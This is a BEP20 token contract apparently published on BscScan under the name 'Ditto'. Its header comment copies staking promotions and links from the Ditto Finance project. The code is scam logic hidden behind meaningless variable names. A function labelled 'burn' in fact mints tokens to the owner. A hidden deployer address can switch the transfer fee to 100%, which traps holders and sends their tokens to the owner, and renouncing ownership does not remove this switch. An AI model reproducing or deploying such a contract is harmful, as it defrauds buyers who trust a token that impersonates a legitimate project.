/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
Ditto
Premining Rewards are live! 🚨
We're delivering early yields for your #Aptos!
1.Stake $stAPT, stAPT-$APT, or stAPT-$USDC with us at https://stake.dittofinance.io/rewards
2.Earn Premining Rewards that can be redeemed for our upcoming $DTO token at a *deep* discount.
Details below 👇
The liquid staking solution for #Aptos. 💧 
$stAPT 👉 Safe. Secure. Everywhere.
Discord: https://discord.gg/ditto-fi
Medium: https://medium.com/@dittoprotocol
Twitter:https://twitter.com/Ditto_Finance   
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.2;
contract Ditto {
address public  trIDYL = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public  qqLuvi = address(0);
address public  PyFQQK = address(0);
uint256 public  nukKrU = 10000000000000000;
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  UwWghL = address(0);
address public  DxDrdZ = address(0);
address public  FcHylB = address(0);
uint256 public  ZCZCDj = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  DRqkfM = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  GHsEUr = 100000000000000000000000;
uint256 public constant XpFyQe = 9+1;
uint256 public  hSkGvO = 100000000000000000000;
uint256 public  ykLJIO = 10000000000000000000000000000;
string public  symbol = "Ditto";
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  name = "Ditto";
uint256 public  jfPHPL = 100000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  faAHMt = 100000000000000000;
uint256 public  LEIGAR = 10000000000000000000;
uint256 private  mbxVKX = 10000000000000;
address public owner;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DiQKVc");
require(to != address(0), "DiQKVc");
require(amount <= balanceOf[from], "DiQKVc");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XpFyQe/mbxVKX ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==UwWghL){
mbxVKX = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () {
UwWghL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}